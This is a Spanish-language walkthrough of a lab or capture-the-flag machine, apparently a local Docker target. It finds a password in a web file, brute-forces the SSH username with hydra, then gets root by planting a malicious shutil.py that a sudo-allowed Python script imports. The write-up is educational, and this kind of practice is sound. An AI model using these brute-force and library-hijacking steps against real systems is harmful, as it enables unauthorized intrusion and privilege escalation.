## 1. Reconocimiento Inicial con Nmap

El primer paso en cualquier evaluación de seguridad es el reconocimiento de la red y los servicios expuestos.

```bash
nmap -O -sC -sV 172.17.0.2
```

### Resultado del Escaneo Nmap

```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)  
|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)  
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))  
|_http-server-header: Apache/2.4.58 (Ubuntu)  
|_http-title: Apache2 Ubuntu Default Page: It works  
MAC Address: 02:42:AC:11:00:02 (Unknown)  
Device type: general purpose|router  
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X  
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3  
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)  
Network Distance: 1 hop  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## 2. Enumeración de Contenido Web con Gobuster

Dado que el puerto 80 está abierto y muestra la página por defecto de Apache, el siguiente paso es realizar una enumeración de directorios y archivos para descubrir contenido oculto o no enlazado. 

### Comando Gobuster

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html, txt
```

### Resultado de Gobuster

```bash
/.html                (Status: 403) [Size: 275]  
/index.html           (Status: 200) [Size: 10671]  
/index.php            (Status: 200) [Size: 26]  
/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]  
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
```

El escaneo de `gobuster` revela varios archivos y directorios interesantes:

*   `/index.html`: La página principal del sitio web (la página por defecto de Apache).
*   `/index.php`: Un archivo PHP que devuelve un código de estado `200` (OK) y un tamaño de 26 bytes. Esto es inusualmente pequeño para una página web completa y sugiere que podría contener información sensible o una pista.
*   `/javascript`: Un directorio que devuelve un código de estado `301` (Redirección Permanente).
*   `/.html` y `/server-status`: Ambos devuelven `403 Forbidden`, lo que significa que existen pero el acceso está denegado.

### Contenido de `index.php`

Al acceder a `http://172.17.0.2/index.php`, se encuentra el siguiente contenido:

```txt
JIFGHDS87GYDFIGD
```

Esta cadena es muy probable que sea una credencial o una clave. 

## 3. Acceso Inicial vía SSH

Con la cadena `JIFGHDS87GYDFIGD` obtenida, el siguiente paso es intentar utilizarla como contraseña para acceder al sistema a través de SSH. Se necesita un nombre de usuario. 

```bash
hydra -L /rutaASeclists/Usernames/xato-net-10-million-usernames.txt -p JIFGHDS87GYDFIGD 172.17.0.2 ssh
```

**Salida**
```
[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
```
### Conexión SSH

```bash
ssh carlos@172.17.0.2
# JIFGHDS87GYDFIGD
```

Se obtiene acceso a una shell de usuario.

## 4. Escalada de Privilegios: Python Library Hijacking

Una vez que se ha obtenido acceso como un usuario de bajos privilegios (`carlos`), el siguiente objetivo es escalar privilegios a `root`. Se utiliza el comando `sudo -l` para verificar qué comandos puede ejecutar el usuario `carlos` con privilegios de `sudo` sin necesidad de contraseña.

### Verificación de Permisos `sudo`

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

El usuario `carlos` puede ejecutar el comando `/usr/bin/python3 /opt/script.py` como cualquier usuario (ALL), incluyendo `root`, y lo más importante, `NOPASSWD`, lo que significa que no se le pedirá la contraseña para ejecutarlo. 

### Análisis del Script Python (`/opt/script.py`)

Se navega al directorio `/opt` y se inspecciona el contenido del script `script.py`:

```bash
cd /opt 
cat script.py


import shutil  
  
def copiar_archivo(origen, destino):  
   shutil.copy(origen, destino)  
   print(f'Archivo copiado de {origen} a {destino}')  
  
if __name__ == '__main__':  
   origen = '/opt/script.py'  
   destino = '/tmp/script_backup.py'  
   copiar_archivo(origen, destino)
```

El script `script.py` importa la librería `shutil` y utiliza la función `shutil.copy` para copiar el propio script a `/tmp/script_backup.py`. La clave de la vulnerabilidad reside en la línea `import shutil`. Cuando Python importa un módulo, busca en una serie de directorios predefinidos . Si un módulo con el mismo nombre existe en el directorio actual, Python lo cargará en lugar del módulo legítimo del sistema. Esto se conoce como **Python Library Hijacking** o secuestro de librerías de Python.

### Explotación: Secuestro de la Librería `shutil`

Para explotar esta vulnerabilidad, se creará un archivo llamado `shutil.py` en el mismo directorio donde se ejecutará `script.py` (o en un directorio que tenga precedencia en la ruta de búsqueda de módulos de Python). Este `shutil.py` malicioso contendrá código que nos dará una shell de `root`.

```bash
touch shutil.py
echo -e "import os\nos.system(\"bash -p\")" > shutil.py
```

### Ejecución del Script y Obtención de Root

```bash
sudo -u root /usr/bin/python3 /opt/script.py
```

Cuando `script.py` intente importar `shutil`, Python cargará nuestro `shutil.py` malicioso en lugar del legítimo. Esto ejecutará `os.system("bash -p")`, dándonos una shell con privilegios de `root`.

Se verifica el usuario actual:

```bash
whoami
# root
```
